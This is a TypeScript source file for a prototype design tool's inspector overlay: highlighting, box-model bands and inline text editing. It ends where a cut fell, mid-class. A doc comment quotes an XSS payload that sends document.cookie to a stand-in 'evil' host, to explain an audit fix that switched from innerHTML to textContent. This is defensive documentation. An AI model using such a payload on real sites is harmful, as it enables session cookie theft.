/**
 * Desde Bridge — Inspector Overlay
 *
 * Extracted from `comment-bridge.ts`. The dev-inspector overlay (own shadow
 * DOM): hover/select highlighting, box-model guides, component breadcrumb, and
 * the double-click-to-edit-text flow. Reads elements via the injected
 * `inspectElement` / `attributeElement` and emits ELEMENT_INSPECTED /
 * HOVER_TARGET_CHANGED / etc. through the injected `sendToShell`. Class body
 * verbatim; INSPECTOR_OVERLAY_STYLES co-moved.
 */
import { sendToShell, inspectElement, attributeElement } from "./bridge-runtime"
import { generateSelector } from "./selector-engine"
import { isBridgeOwnElement } from "./selector-helpers"
import { detectFrameworkComponent, detectDirectComponent, buildVue3ComponentTree } from "./framework-component-detection"
import type { SelectModeOverlay } from "./bridge-types"

/**
 * Whether an element is a single-text-run leaf — the gate for inline
 * double-click-to-edit (and the editor-mode `text` hover cursor cue that
 * makes the gesture discoverable, Phase 0). Mixed-content / structured children
 * need a different UX, so they're excluded.
 *
 * **Comment nodes are skipped.** Vue emits `<!--v-if-->` / `<!--v-for-->` /
 * fragment anchors as siblings of the text it renders, so a naive
 * `childNodes.length === 1` check refused any element carrying a `v-if` — the
 * text was silently un-editable with no error, and adding a directive to
 * working markup broke the gesture. Comments carry no visual content, so they
 * cannot disqualify a leaf.
 *
 * **Multiple text nodes still lose.** `Hello {{ msg }}` renders as a static run
 * plus an interpolated run; an edit to the merged string can't be attributed
 * back to one source span, so it stays refused rather than risking the wrong
 * rewrite.
 */
export function isTextEditableLeaf(el: Element): boolean {
  let textNode: ChildNode | null = null
  for (const node of Array.from(el.childNodes)) {
    if (node.nodeType === Node.COMMENT_NODE) continue
    if (node.nodeType !== Node.TEXT_NODE) return false
    if (textNode) return false
    textNode = node
  }
  return textNode !== null
}


/**
 * Where an element's gaps actually are.
 *
 * `column-gap`/`row-gap` give the size; only the children give the place. The
 * children are grouped into columns by left edge and rows by top edge, so one
 * pass covers flex-row (one row, N columns), flex-column (N rows, one column)
 * and grid (both) — and a wrapped flex line gets its row band without special
 * casing.
 *
 * Tolerance is half a gap: subpixel layout means two children in the same
 * column rarely share an exact left edge, and half a gap is wide enough to
 * absorb that without merging genuinely adjacent tracks.
 */
export function gapBands(
  el: Element,
  computed: CSSStyleDeclaration,
): Array<{ left: number; top: number; width: number; height: number }> {
  const colGap = parseFloat(computed.columnGap)
  const rowGap = parseFloat(computed.rowGap)
  const display = computed.display
  if (!/(^|\s)(inline-)?(flex|grid)$/.test(display)) return []
  if (!(colGap > 0) && !(rowGap > 0)) return []

  const kids = Array.from(el.children)
    .map((c) => c.getBoundingClientRect())
    .filter((r) => r.width > 0 && r.height > 0)
  if (kids.length < 2) return []

  const cluster = (values: number[], tol: number): number[] => {
    const sorted = [...values].sort((a, b) => a - b)
    const out: number[] = []
    for (const v of sorted) {
      if (out.length === 0 || v - out[out.length - 1] > tol) out.push(v)
    }
    return out
  }

  const bands: Array<{ left: number; top: number; width: number; height: number }> = []
  const top = Math.min(...kids.map((r) => r.top))
  const bottom = Math.max(...kids.map((r) => r.bottom))
  const left = Math.min(...kids.map((r) => r.left))
  const right = Math.max(...kids.map((r) => r.right))

  if (colGap > 0) {
    const starts = cluster(kids.map((r) => r.left), colGap / 2)
    for (let i = 0; i < starts.length - 1; i++) {
      // The right edge of the widest child in this column.
      const edge = Math.max(
        ...kids.filter((r) => r.left <= starts[i] + colGap / 2).map((r) => r.right),
      )
      const next = starts[i + 1]
      if (next - edge > 0.5) bands.push({ left: edge, top, width: next - edge, height: bottom - top })
    }
  }
  if (rowGap > 0) {
    const starts = cluster(kids.map((r) => r.top), rowGap / 2)
    for (let i = 0; i < starts.length - 1; i++) {
      const edge = Math.max(
        ...kids.filter((r) => r.top <= starts[i] + rowGap / 2).map((r) => r.bottom),
      )
      const next = starts[i + 1]
      if (next - edge > 0.5) bands.push({ left, top: edge, width: right - left, height: next - edge })
    }
  }
  return bands
}

const INSPECTOR_OVERLAY_STYLES = `
  :host { all: initial; }

  .pt-inspect-overlay {
    position: fixed;
    pointer-events: none;
    z-index: 2147483645;
    border: 1.5px dotted oklch(0.575 0.135 190);
    background: transparent;
    border-radius: 2px;
    transition: top 0.05s, left 0.05s, width 0.05s, height 0.05s;
  }

  /* Selection looks the same as hover on purpose. A 3px solid rule for
     selection changed the outline's weight the moment you committed to an
     element, which reads as the element itself having changed. What marks a
     selection is the panel filling in, not the box getting heavier. */
  .pt-inspect-overlay--selected {
    border: 1.5px dotted oklch(0.575 0.135 190);
    background: transparent;
  }

  /* The one label. There used to be a second, a pink chip under the box
     carrying the element's pixel size; it was removed 2026-08-14. A number
     that changes on every hover, pinned to the bottom edge where it collides
     with whatever is below, was reading as chrome rather than as information,
     and the Inspector panel already reports the box model properly.

     Primary teal, and the literal values are the shell's own --primary and
     --primary-foreground. The bridge runs in the PROTOTYPE's document, so it
     cannot read the shell's custom properties; the outline above already
     hard-codes the same teal for the same reason. If the brand moves, these
     literals move with it. */
  .pt-inspect-tag {
    position: fixed;
    pointer-events: none;
    z-index: 2147483645;
    background: oklch(0.575 0.135 190);
    color: oklch(0.99 0.006 190);
    font-family: ui-monospace, SFMono-Regular, 'SF Mono', Menlo, monospace;
    font-size: 10px;
    font-weight: 400;
    padding: 2px 6px;
    border-radius: 3px;
    white-space: nowrap;
  }

  /* Hierarchy by weight and opacity, not by hue. The old greens, ambers and
     purples were picked to sit on a dark plum ground; on a saturated teal they
     compete with it and with each other. */
  .pt-inspect-tag .pt-component { font-weight: 600; }
  .pt-inspect-tag .pt-id { opacity: 0.88; }
  .pt-inspect-tag .pt-class { opacity: 0.74; }

  /* Spacing bands: margin, padding, and whatever comes next.
     Hatching, not a wash. A solid tint over a margin looks like a colour the
     design has; stripes read as annotation at any size. 1px on a 6px pitch
     stays legible on a 2px band and does not moiré on a 200px one.

     Written once here with a per-band colour, so a gap band (there is none
     today) is one selector and one variable rather than a third copy of the
     gradient — which is how margin and padding drifted apart to begin with. */
  .pt-inspect-margin,
  .pt-inspect-padding,
  .pt-inspect-gap {
    position: fixed;
    pointer-events: none;
    z-index: 2147483644;
    background: repeating-linear-gradient(
      45deg,
      var(--pt-band) 0,
      var(--pt-band) 1px,
      transparent 1px,
      transparent 6px
    );
  }

  .pt-inspect-margin { --pt-band: rgba(249, 115, 22, 0.55); }
  .pt-inspect-padding { --pt-band: rgba(34, 197, 94, 0.55); }
  .pt-inspect-gap { --pt-band: rgba(168, 85, 247, 0.55); }

  /* No fill. The content box is the element itself, and a blue wash over it
     changed every colour underneath, which is the one thing an inspector must
     not do. The box is still tracked and still sized, so the dimensions
     readout and the box-model panel are unaffected. */
  .pt-inspect-content {
    position: fixed;
    pointer-events: none;
    z-index: 2147483644;
    background: transparent;
  }

  /* Hover fills read lighter than selection fills so committed selection
     still stands out. Applied as an extra class alongside the margin/
     padding/content class (see showOverlay's \`hoverDim\` suffix). */
  .pt-inspect-fill--hover {
    opacity: 0.5;
  }
`

/**
 * Build the hover/selection label (`<div class="pt-inspect-tag">`) for an
 * inspected element.
 *
 * Built node-by-node with `textContent`, never `innerHTML`. Every value that
 * lands here — `el.id`, `el.classList`, and the component name — is authored
 * by the PROTOTYPE, which in the viewer's case is untrusted repository code.
 * The previous implementation assembled an HTML string and assigned it to
 * `innerHTML`, so an element declared as
 * `<div id="&lt;img src=x onerror=fetch('//evil/'+document.cookie)&gt;">`
 * executed script the moment a reviewer hovered it (audit S16).
 *
 * The Shadow DOM this is appended into is NOT a mitigation: it isolates
 * styling and selectors, not script. An injected handler runs in this frame's
 * realm with this frame's privileges — which is precisely the realm the shell
 * trusts as "the bridge".
 *
 * Exported for the colocated test: the escaping property is the point of this
 * function, and it cannot be asserted through the private `showOverlay`.
 */
export function buildInspectTag(el: Element, componentName?: string): HTMLDivElement {
  const tag = document.createElement("div")
  tag.className = "pt-inspect-tag"
  const span = (cls: string, text: string): HTMLSpanElement => {
    const s = document.createElement("span")
    s.className = cls
    s.textContent = text
    return s
  }
  if (componentName) {
    tag.appendChild(span("pt-component", `<${componentName}>`))
  } else {
    tag.appendChild(document.createTextNode(el.tagName.toLowerCase()))
    if (el.id) tag.appendChild(span("pt-id", `#${el.id}`))
    const classes = Array.from(el.classList).slice(0, 3)
    if (classes.length) tag.appendChild(span("pt-class", `.${classes.join(".")}`))
  }
  return tag
}

export class InspectorOverlayManager implements SelectModeOverlay {
  private root: HTMLElement
  private shadow: ShadowRoot
  private active = false
  private selectedElement: Element | null = null
  private hoveredElement: Element | null = null
  /** Persistent selection chrome (firm `--selected` box + guides) for the
   *  committed selection. Lives in its own layer so a hover elsewhere never
   *  touches it — see Fix 3 / "the selected item should stay selected". */
  private selectionElements: HTMLElement[] = []
  /** Ephemeral hover box + guides, redrawn on every mousemove. Cleared and
   *  redrawn independently of `selectionElements`. */
  private hoverElements: HTMLElement[] = []
  /** What each layer is currently drawing. The chrome is `position: fixed`
   *  at coordinates read once from `getBoundingClientRect()`, so a scroll
   *  invalidates it; keeping the source element (and its already-resolved
   *  component name) lets the scroll handler redraw in place. Written by
   *  `showOverlay`, dropped by the matching clear. */
  private selectionDrawn: { el: Element; componentName?: string } | null = null
  private hoverDrawn: { el: Element; componentName?: string } | null = null
  /** rAF handle for the scroll/resize reposition debounce. */
  private repositionRafToken = 0

  /** Editor mode: emits ESCAPE_PRESSED to the shell alongside the
   *  Escape-deselect (so annotation popups can close), and
   *  keeps hover events firing after a selection has been committed (the
   *  hover overlay still draws so the designer always has visual feedback
   *  under the cursor — see `selectionElements`/`hoverElements` above for how
   *  that coexists with the persistent selection chrome). */
  private editorMode = false
  /** Toggle for HOVER_TARGET_CHANGED emission. Editor enables; review-app keeps off. */
  private hoverEventsEnabled = false
  /** rAF handle for hover-event throttling. */
  private hoverRafToken = 0
  /** Element pending emission on the next animation frame. */
  private lastHoverTarget: Element | null = null
  // ── Double-click-to-edit-text ─────────────────────────────────────
  // When non-null, the inspector is letting clicks/typing through to
  // this element so the designer can position the cursor and type.
  // Single-click anywhere else commits the edit (capturing the
  // mutation if changed) and re-arms full click intercept.
  private editingTextElement: HTMLElement | null = null
  private editingTextOriginalValue: string = ""
  private editingTextOriginalAttr: string | null = null
  /**
   * Framework anchor comments (`<!--v-if-->`, `<!--v-for-->`, fragment
   * markers) that were children of the element when editing began, with the
   * index they sat at. contentEditable can destroy them — a select-all
   * overwrite, or the Escape path's `textContent =` — and Vue's vnode tree
   * holds live references to those exact nodes, so losing one breaks the next
   * patch that tries to insert against it. Recorded on begin, re-inserted on
   * commit. See `restoreAnchorComments`.
   */
  private editingTextAnchors: { node: Node; index: number }[] = []
  private editingTextBlurHandler: ((e: FocusEvent) => void) | null = null
  private editingTextKeydownHandler: ((e: KeyboardEvent) => void) | null = null
  /**
   * Hook supplied by `init()` so the inspector can report the
   * captured mutation when editing finishes — keeps the mutation
   * pipeline (sourceLoc resolution, v-for disambiguation) in
   * `domEditMode` rather than duplicating it here.
   */
  private captureTextMutation:
    | ((el: Element, before: string, after: string) => void)
    | null = null

  private boundMouseMove: (e: MouseEvent) => void
  private boundMouseDown: (e: MouseEvent) => void
  private boundClick: (e: MouseEvent) => void
  private boundDblClick: (e: MouseEvent) => void
  private boundContextMenu: (e: MouseEvent) => void
  private boundKeydown: (e: KeyboardEvent) => void
  private boundDocMouseOut: (e: MouseEvent) => void
  private boundScheduleReposition: () => void

  constructor() {
    this.root = document.createElement("div")
    this.root.setAttribute("data-prototype-flow", "inspector-overlay")
    this.shadow = this.root.attachShadow({ mode: "closed" })

    const style = document.createElement("style")
    style.textContent = INSPECTOR_OVERLAY_STYLES
    this.shadow.appendChild(style)

    document.body.appendChild(this.root)

    this.boundMouseMove = this.handleMouseMove.bind(this)
    this.boundMouseDown = this.handleMouseDown.bind(this)
    this.boundClick = this.handleClick.bind(this)
    this.boundDblClick = this.handleDblClick.bind(this)
    this.boundContextMenu = this.handleContextMenu.bind(this)
    this.boundKeydown = this.handleKeydown.bind(this)
    this.boundDocMouseOut = this.handleDocMouseOut.bind(this)
    this.boundScheduleReposition = this.scheduleReposition.bind(this)

    // Scroll/resize tracking is wired for the manager's LIFETIME, not inside
    // activate(). Two reasons: `HIGHLIGHT_COMPONENT` draws selection chrome
    // without the inspector being active, and this manager is never destroyed
    // (it appends itself to the body here and stays). The handler early-returns
    // when neither layer has anything drawn, so an inactive inspector costs a
    // predicate.
    //
    // Capture phase on `document`, not `window`: `scroll` does not bubble, so a
    // bubble-phase listener only ever sees the document scrolling — an inner
    // scroll pane (the common case in a real app shell) would never reach it.
    // Same wiring as anchor-pins.ts.
    document.addEventListener("scroll", this.boundScheduleReposition, true)
    window.addEventListener("resize", this.boundScheduleReposition)
  }

  /** Coalesce a burst of scroll events into one redraw per frame. */
  private scheduleReposition(): void {
    if (this.repositionRafToken !== 0) return
    if (!this.selectionDrawn && !this.hoverDrawn) return
    this.repositionRafToken = requestAnimationFrame(() => {
      this.repositionRafToken = 0
      this.repositionOverlays()
    })
  }

  /**
   * Redraw each live layer against its element's CURRENT viewport rect.
   *
   * A wholesale redraw rather than a cheaper coordinate patch, deliberately:
   * every number in the chrome (box, dimensions, tag, padding/margin/gap
   * bands, content box) derives from that one rect, so a separate positioning
   * path would be a second copy of `showOverlay`'s math and free to drift from
   * it. The expensive part — component-name resolution — already happens in
   * the caller and is replayed from the record, so nothing re-walks the
   * framework tree here.
   *
   * An element that has left the DOM loses its chrome instead of keeping a box
   * pinned over whatever now occupies those coordinates.
   */
  private repositionOverlays(): void {
    const selection = this.selectionDrawn
    if (selection) {
      if (selection.el.isConnected) {
        this.showOverlay(selection.el, "selection", selection.componentName)
      } else {
        this.clearSelectionOverlay()
      }
    }
    const hover = this.hoverDrawn
    if (hover) {
      if (hover.el.isConnected) {
        this.showOverlay(hover.el, "hover", hover.componentName)
      } else {
        this.clearHoverOverlay()
      }
    }
  }

  activate(): void {
    if (this.active) return
    this.active = true
    document.addEventListener("mousemove", this.boundMouseMove, true)
    // mousedown must be intercepted before native focus runs —
    // otherwise clicking a `KInput` (or any focusable element)
    // selects it AND lets the user start typing into the substrate.
    // The click handler's preventDefault doesn't help: focus
    // happens on mousedown, which fires first.
    document.addEventListener("mousedown", this.boundMouseDown, true)
    document.addEventListener("click", this.boundClick, true)
    document.addEventListener("dblclick", this.boundDblClick, true)
    // contextmenu listens in BUBBLE phase (not capture) so the
    // table-edge overlay's capture-phase listener gets first crack
    // and can win via `stopPropagation()` when the right-click lands
    // on a band. On non-band right-clicks table-edge returns early
    // and the event bubbles up to this listener.
    document.addEventListener("contextmenu", this.boundContextMenu, false)
    document.addEventListener("keydown", this.boundKeydown, true)
    // Hover chrome must not linger when the pointer LEAVES the prototype
    // iframe for the shell (edit panel, top bar, …) — mousemove stops
    // firing at the boundary, so without this the last hover box would
    // stay frozen. A document-level mouseout whose relatedTarget is null
    // is exactly "the pointer left this document" (Mo's decision
    // 2026-08-04: outside the prototype, only SELECTED chrome shows).
    document.addEventListener("mouseout", this.boundDocMouseOut, true)
    document.body.style.cursor = "crosshair"
  }

  deactivate(): void {
    if (!this.active) return
    this.active = false
    this.selectedElement = null
    this.hoveredElement = null
    // Commit any in-progress text edit so we don't strand
    // contenteditable on an element after editor mode exits.
    this.commitEditingText("escape")
    document.removeEventListener("mousemove", this.boundMouseMove, true)
    document.removeEventListener("mousedown", this.boundMouseDown, true)
    document.removeEventListener("click", this.boundClick, true)
    document.removeEventListener("dblclick", this.boundDblClick, true)
    document.removeEventListener("contextmenu", this.boundContextMenu, false)
    document.removeEventListener("keydown", this.boundKeydown, true)
    document.removeEventListener("mouseout", this.boundDocMouseOut, true)
    document.body.style.cursor = ""
    this.clearOverlay()
  }

  /** Wired by init(): a sink for "user finished a text edit" that
   *  routes through `domEditMode.captureDirectMutation` to share the
   *  sourceLoc/v-for/save pipeline with all other DOM mutations. */
  setCaptureTextMutation(
    fn: ((el: Element, before: string, after: string) => void) | null,
  ): void {
    this.captureTextMutation = fn
  }

  private handleMouseMove(e: MouseEvent): void {
    // Editor wants hover events even while a selection is committed (so the
    // shell can drive breadcrumb-on-hover, sibling preview, etc.). Outside
    // editor mode, the existing short-circuit stays.
    if (this.selectedElement && !this.editorMode) return
    const el = document.elementFromPoint(e.clientX, e.clientY)
    if (!el || el === this.hoveredElement) return
    if (this.isOwnElement(el)) return
    this.hoveredElement = el

    // Hovering the already-selected element: the persistent selection
    // chrome already covers it — skip the hover layer so we don't draw a
    // second (dimmer) box directly on top of the selection box.
    if (el === this.selectedElement) {
      this.clearHoverOverlay()
    } else {
      const hoverName = this.resolveComponentName(el)
      this.showOverlay(el, "hover", hoverName)
    }
    // Phase 0 — discoverability cue: a `text` cursor over editable text leaves
    // signals double-click-to-edit (the gesture already works). Falls back to
    // the inspector's `crosshair`. Editor mode only (dblclick-edit is gated on
    // it); reverts naturally as the cursor moves to a new element.
    document.body.style.cursor =
      this.editorMode && isTextEditableLeaf(el) ? "text" : "crosshair"
    if (this.editorMode) {
      // Shell consumers (breadcrumb-on-hover, sibling preview, etc.) also get
      // the rAF-throttled event. The bridge keeps drawing the overlay so the
      // designer always sees what's under the cursor.
      this.scheduleHoverEvent(el)
    }
  }

  /** rAF-throttle hover event emission so we don't flood the shell at cursor speed. */
  private scheduleHoverEvent(el: Element): void {
    if (!this.hoverEventsEnabled) return
    this.lastHoverTarget = el
    if (this.hoverRafToken !== 0) return
    this.hoverRafToken = requestAnimationFrame(() => {
      this.hoverRafToken = 0
      const target = this.lastHoverTarget
      if (!target) return
      sendToShell({
        type: "HOVER_TARGET_CHANGED",
        payload: this.buildHoverTargetPayload(target),
      })
    })
  }

  /** Lightweight HoverTarget shape (selector + nearest component metadata).
   *  Distinct from the heavyweight inspectElement() output reserved for committed selections. */
  private buildHoverTargetPayload(el: Element): Record<string, unknown> | null {
    const selector = generateSelector(el)
    if (!selector) return null
    let name: string | undefined
    let file: string | undefined
    let line: number | undefined
    let pkg: string | undefined
    try {
      const tree = buildVue3ComponentTree(el)
      if (tree.length > 0) {
        const leaf = tree[tree.length - 1]
        name = leaf.name
        file = leaf.file
        line = leaf.line
        pkg = leaf.packageName
      } else {
        const direct = detectDirectComponent(el)
        if (direct) {
          name = direct.name
          file = direct.file
          line = direct.line
        }
      }
    } catch { /* leave fields undefined */ }
    let attribution: ReturnType<typeof attributeElement> = undefined
    try { attribution = attributeElement(el) } catch { /* leave undefined */ }
    return {
      selector,
      componentName: name,
      componentFile: file,
      componentLine: line,
      packageName: pkg,
      authoredAt: attribution?.authoredAt,
      editTarget: attribution?.editTarget,
      isLibrary: attribution?.isLibrary,
      iterationContext: attribution?.iteration,
    }
  }

  private handleMouseDown(e: MouseEvent): void {
    const el = document.elementFromPoint(e.clientX, e.clientY)
    if (!el || this.isOwnElement(el)) return

    // While text-edit is active on a leaf, allow native mousedown
    // through so the caret can move within the contenteditable.
    // Mousedown elsewhere will commit the edit on the subsequent
    // click handler — same flow as outside-click commit.
    if (this.editingTextElement) {
      if (
        el === this.editingTextElement ||
        this.editingTextElement.contains(el)
      ) {
        return
      }
    }

    // Block native focus, drag-init, and form-element focus rings.
    // The click handler that follows still runs (we don't stop
    // propagation here) and drives selection state — preventDefault
    // only suppresses the browser's default mousedown behavior, not
    // the click event itself.
    e.preventDefault()
    // Active focus on a previously-focused input (e.g. user
    // mousedown'd a KInput, then mousedown'd a different one) will
    // not move because we preventDefault'd, but a focused input
    // still has a blinking caret. Force it to blur so the substrate
    // looks visually inert in inspect mode.
    if (
      document.activeElement instanceof HTMLElement &&
      !this.isOwnElement(document.activeElement) &&
      (!this.editingTextElement ||
        document.activeElement !== this.editingTextElement)
    ) {
      document.activeElement.blur()
    }
  }

  private handleClick(e: MouseEvent): void {
    const el = document.elementFromPoint(e.clientX, e.clientY)
    if (!el || this.isOwnElement(el)) return

    // If a text edit is in progress, let clicks on (or inside) the
    // editing element pass through so the designer can move the
    // caret. Clicks elsewhere commit the edit and fall through to
    // normal selection.
    if (this.editingTextElement) {
      if (
        el === this.editingTextElement ||
        this.editingTextElement.contains(el)
      ) {
        // Pass-through: let the click land so the caret can move. Still
        // preventDefault so a rapid 3rd/4th click during double-click-to-edit
        // doesn't reach an ancestor `<a>`'s default navigation — caret
        // placement itself is mousedown-driven (handleMouseDown), untouched
        // by this. No stopPropagation: the pass-through's other semantics
        // (letting the click reach the contenteditable) stay as-is.
        e.preventDefault()
        return
      }
      this.commitEditingText("click-elsewhere")
    }

    e.preventDefault()
    e.stopPropagation()
    e.stopImmediatePropagation()

    // Clicking the already-selected element keeps it selected — no
    // toggle-deselect. Repeated clicks on the same target are a no-op
    // so the designer can't accidentally lose their selection.
    if (this.selectedElement === el) {
      return
    }

    this.selectedElement = el
    this.hoveredElement = null
    // Render the persistent selection layer for the clicked element in BOTH
    // modes. The old "editor renders its own selection chrome shell-side"
    // rationale is obsolete — nothing shell-side draws on-canvas chrome, so
    // suppressing here meant editor mode showed nothing at all on select.
    // This layer persists across mousemove (see handleMouseMove's hover-layer
    // skip) until a new selection or an explicit clear.
    const clickName = this.resolveComponentName(el)
    this.showOverlay(el, "selection", clickName)
    try {
      sendToShell({ type: "ELEMENT_INSPECTED", payload: inspectElement(el) })
    } catch (err) {
      console.error("[Desde Inspector] inspectElement failed:", err)
      // Send minimal data so the panel still shows something
      const rect = el.getBoundingClientRect()
      sendToShell({
        type: "ELEMENT_INSPECTED",
        payload: {
          tagName: el.tagName.toLowerCase(),
          id: el.id || "",
          classes: Array.from(el.classList),
          rect: { x: rect.x, y: rect.y, width: rect.width, height: rect.height, top: rect.top, right: rect.right, bottom: rect.bottom, left: rect.left },
          styles: [],
          tokens: [],
          boxModel: { width: rect.width, height: rect.height, margin: { top: 0, right: 0, bottom: 0, left: 0 }, border: { top: 0, right: 0, bottom: 0, left: 0 }, padding: { top: 0, right: 0, bottom: 0, left: 0 }, content: { width: rect.width, height: rect.height } },
          selector: "",
          pageRoute: window.location.pathname || undefined,
        },
      })
    }
  }

  /**
   * Right-click in editor mode. Suppresses the browser's native
   * context menu, selects the element, and emits
   * `ELEMENT_CONTEXT_MENU` to the shell so it can open the in-app
   * editor menu anchored at the click point. Also emits the standard
   * `ELEMENT_INSPECTED` so the shell's selection-state machinery
   * synchronizes the same as a left-click.
   *
   * The element context menu is a editor-only affordance. In review
   * mode (no editor wiring) there's no shell-side consumer, so
   * suppressing the native menu would leave the user with nothing.
   * Return early instead — review users keep the browser's native
   * context menu.
   */
  private handleContextMenu(e: MouseEvent): void {
    if (!this.editorMode) return
    // If a previous listener (e.g. table-edge band hit) handled the
    // event, defer. We're in BUBBLE phase, so this only fires when the
    // capture-phase table-edge listener returned without
    // `stopPropagation()` — i.e. there was no band hit.
    if (e.defaultPrevented) return

    const el = document.elementFromPoint(e.clientX, e.clientY)
    if (!el || this.isOwnElement(el)) return

    // If text editing is in progress, commit before opening the menu.
    if (this.editingTextElement) {
      if (
        el === this.editingTextElement ||
        this.editingTextElement.contains(el)
      ) {
        return
      }
      this.commitEditingText("contextmenu-elsewhere")
    }

    e.preventDefault()
    e.stopPropagation()

    this.selectedElement = el
    this.hoveredElement = null
    // handleContextMenu only ever runs in editor mode (early return at the
    // top of this handler), so this renders the same persistent selection
    // layer as handleClick — see the comment there.
    const clickName = this.resolveComponentName(el)
    this.showOverlay(el, "selection", clickName)

    let inspection
    try {
      inspection = inspectElement(el)
    } catch (err) {
      console.error("[Desde Inspector] inspectElement failed:", err)
      return
    }
    sendToShell({ type: "ELEMENT_INSPECTED", payload: inspection })
    sendToShell({
      type: "ELEMENT_CONTEXT_MENU",
      payload: {
        inspection,
        menuAnchor: { x: e.clientX, y: e.clientY },
      },
    })
  }

  private handleDblClick(e: MouseEvent): void {
    if (!this.editorMode) return
    const el = document.elementFromPoint(e.clientX, e.clientY) as HTMLElement | null
    if (!el || this.isOwnElement(el)) return
    // Only leaf-text elements get inline editing — same gate the
    // inspector uses for its "Text" field + the hover cursor cue.
    if (!isTextEditableLeaf(el)) return
    e.preventDefault()
    e.stopPropagation()
    e.stopImmediatePropagation()
    // Commit a previous edit if one was open on a different element.
    if (this.editingTextElement && this.editingTextElement !== el) {
      this.commitEditingText("dblclick-elsewhere")
    }
    this.beginEditingText(el)
  }

  private beginEditingText(el: HTMLElement): void {
    this.editingTextElement = el
    // `textContent` already excludes comment nodes, so the captured before/
    // after values are unaffected by any anchors present.
    this.editingTextOriginalValue = el.textContent ?? ""
    this.editingTextOriginalAttr = el.getAttribute("contenteditable")
    // Record framework anchors so a destructive edit can't lose them.
    this.editingTextAnchors = Array.from(el.childNodes)
      .map((node, index) => ({ node, index }))
      .filter(({ node }) => node.nodeType === Node.COMMENT_NODE)
    el.setAttribute("contenteditable", "plaintext-only")
    // Focus + select the text so the designer can immediately overwrite.
    el.focus()
    try {
      const range = document.createRange()
      // Select only the TEXT NODE's contents, not the element's. Selecting the
      // element would put any sibling anchor comment inside the selection, so
      // the first keystroke would delete it. `isTextEditableLeaf` guarantees
      // exactly one text node; fall back to the element if it's since gone.
      const textNode = Array.from(el.childNodes).find(
        (n) => n.nodeType === Node.TEXT_NODE,
      )
      if (textNode) range.selectNodeContents(textNode)
      else range.selectNodeContents(el)
      const sel = window.getSelection()
      if (sel) {
        sel.removeAllRanges()
        sel.addRange(range)
      }
    } catch {
      /* ignore — selection APIs occasionally throw on detached nodes */
    }
    const blurHandler = (): void => {
      // setTimeout so a subsequent click on a different element runs
      // its handler before we commit + remove contenteditable.
      setTimeout(() => this.commitEditingText("blur"), 0)
    }
    const keydownHandler = (ev: KeyboardEvent): void => {
      if (ev.key === "Escape") {
        ev.preventDefault()
        ev.stopPropagation()
        // Revert the value before committing-as-no-op so Escape
        // discards the change. Write through the TEXT NODE rather than
        // `el.textContent =`, which would replace every child — destroying
        // any framework anchor comment sitting beside the text.
        // `restoreAnchorComments` in commitEditingText is the backstop for
        // anchors already lost during the edit.
        const editing = this.editingTextElement
        if (editing) {
          const textNode = Array.from(editing.childNodes).find(
            (n) => n.nodeType === Node.TEXT_NODE,
          )
          if (textNode) textNode.nodeValue = this.editingTextOriginalValue
          else editing.textContent = this.editingTextOriginalValue
        }
        this.commitEditingText("escape")
      } else if (ev.key === "Enter") {
        ev.preventDefault()
        ev.stopPropagation()
        this.commitEditingText("enter")
      }
    }
    this.editingTextBlurHandler = blurHandler
    this.editingTextKeydownHandler = keydownHandler
    el.addEventListener("blur", blurHandler, true)
    el.addEventListener("keydown", keydownHandler, true)
  }

  /**
   * Put back any framework anchor comment the edit destroyed.
   *
   * Why anchors matter: Vue's vnode tree holds a live reference to that exact
   * comment node, so losing one means the next patch inserting against it
   * targets a detached node — content in the wrong place, or a throw.
   * Re-inserting the SAME node object (never a clone) preserves those
   * references.
   *
   * Measured in Chromium: typing over a select-all does NOT destroy comment
   * children, but the Escape path's `textContent =` assignment does — which is
   * why that path now writes through the text node instead. This function is
   * the belt-and-braces backstop for the paths we haven't measured: other
   * engines' contentEditable implementations differ, and the designer's
   * browser is not ours to choose.
   */
  private restoreAnchorComments(el: HTMLElement): void {
    for (const { node, index } of this.editingTextAnchors) {
      if (node.parentNode === el) continue
      try {
        const at = el.childNodes[Math.min(index, el.childNodes.length)]
        el.insertBefore(node, at ?? null)
      } catch {
        /* ignore — element detached mid-edit; nothing left to keep consistent */
      }
    }
  }

  private commitEditingText(_reason: string): void {
    const el = this.editingTextElement
    if (!el) return
    this.restoreAnchorComments(el)
    const before = this.editingTextOriginalValue
    // `textContent` skips comment nodes, so restoring anchors above cannot
    // pollute the captured value.
    const after = el.textContent ?? ""
    if (this.editingTextBlurHandler) {
      el.removeEventListener("blur", this.editingTextBlurHandler, true)
    }
    if (this.editingTextKeydownHandler) {
      el.removeEventListener("keydown", this.editingTextKeydownHandler, true)
    }
    // Restore the original contenteditable attribute (which may have
    // been absent — represented as null).
    if (this.editingTextOriginalAttr === null) {
      el.removeAttribute("contenteditable")
    } else {
      el.setAttribute("contenteditable", this.editingTextOriginalAttr)
    }
    el.blur()
    this.editingTextElement = null
    this.editingTextOriginalValue = ""
    this.editingTextOriginalAttr = null
    this.editingTextAnchors = []
    this.editingTextBlurHandler = null
    this.editingTextKeydownHandler = null
    if (before !== after && this.captureTextMutation) {
      this.captureTextMutation(el, before, after)
    }
  }

  /** Pointer left the iframe document entirely → drop hover chrome
   *  (selection chrome persists on its own layer). */
  private handleDocMouseOut(e: MouseEvent): void {
    if (e.relatedTarget !== null) return
    if (this.hoveredElement || this.editorMode) {
      this.hoveredElement = null
      this.clearHoverOverlay()
    }
  }

  private handleKeydown(e: KeyboardEvent): void {
    if (e.key !== "Escape") return
    // Mid-text-edit Escape belongs to the editing element's own keydown
    // handler (revert + commit-as-no-op) — don't also deselect from this
    // document-capture listener, which fires first.
    if (this.editingTextElement) return
    // Escape DESELECTS COMPLETELY (Mo's decision 2026-08-04 — replaced the
    // old editor-mode "ascend to parent" ladder, which had no way off).
    // ESCAPE_PRESSED still goes to the shell so it can close annotation
    // popups etc.; the shell no longer treats it as select-parent.
    if (this.editorMode) sendToShell({ type: "ESCAPE_PRESSED" })
    if (this.selectedElement) {
      this.selectedElement = null
      this.hoveredElement = null
      this.clearOverlay()
      sendToShell({ type: "ELEMENT_DESELECTED" })
    }
  }

  private isOwnElement(el: Element): boolean {
    return isBridgeOwnElement(el)
  }

  /** Resolve the nearest component name for an element — same logic as the panel header. */
  private resolveComponentName(el: Element): string | undefined {
    try {
      const comp = detectFrameworkComponent(el)
      if (comp?.framework === "vue") {
        const tree = buildVue3ComponentTree(el)
        if (tree.length > 0) return tree[tree.length - 1].name
      }
      const direct = detectDirectComponent(el)
      return direct?.name
    } catch { return undefined }
  }

  /** Clear only the ephemeral hover layer \u2014 leaves any persistent selection
   *  chrome untouched. */
